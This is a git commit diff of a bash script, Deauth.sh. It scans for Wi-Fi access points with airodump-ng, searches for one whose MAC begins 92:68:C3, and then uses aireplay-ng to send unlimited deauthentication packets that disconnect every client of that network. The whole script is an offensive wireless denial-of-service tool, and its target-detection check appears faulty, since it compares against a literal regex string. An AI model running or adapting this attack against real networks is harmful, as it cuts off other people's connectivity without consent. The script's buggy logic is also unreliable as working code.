857104dab031f4e56a0cc03eed2d48ebc06610e5
djb0023 <djb0023@uah.edu>
2016-11-22 01:30:26 -0600

    Update Deauth.sh

--- Scripts/Deauth.sh
+++ Scripts/Deauth.sh
@@ -1,16 +1,23 @@
 #!/bin/bash
- 
 
 	ifconfig wlan0 down
 	tput setaf 1;   echo "Succesfully took down wireless card.$(tput sgr 0)"
-	aireplay-ng -9 wlan0
-	tput setaf 6;   echo "Enter network's BSSID:$(tput sgr 0)"
-	read bssID
-	tput setaf 6;   echo "Enter network's channel:$(tput sgr 0)"
-	read channelNum
-	xterm -hold -e airodump-ng -c$channelNum --bssid $bssID wlan0 & tput setaf 3; echo "Starting injection...$(tput sgr 0)"
+	xterm -hold -e airodump-ng -w dump wlan0 & tput setaf 3; echo "Searching for APs...$(tput sgr 0)"	# Scan for APs
+	i=true
 
-	tput setaf 6;   echo "Enter number of deauthentication packets (0 for infinite):$(tput sgr 0)"
-	read deauthPackets
-	aireplay-ng -0 $deauthPackets -a $bssID wlan0
+	while [[ $i == true ]]
+	do
+		apMAC=$(grep -Eo "92:68:C3:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)	# Search and trim MAC
+
+		if [[ $apMAC == "92:68:C3:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" ]]
+		then
+			tput setaf 1; echo "Target AP Found!$(tput sgr 0)"
+			echo $apMAC
+			i=false
+
+		fi	# If MAC not found, search again
+	done
+
+	aireplay-ng -0 0 -a $apMAC wlan0	# If MAC found, deauthenticate all devices
+
 
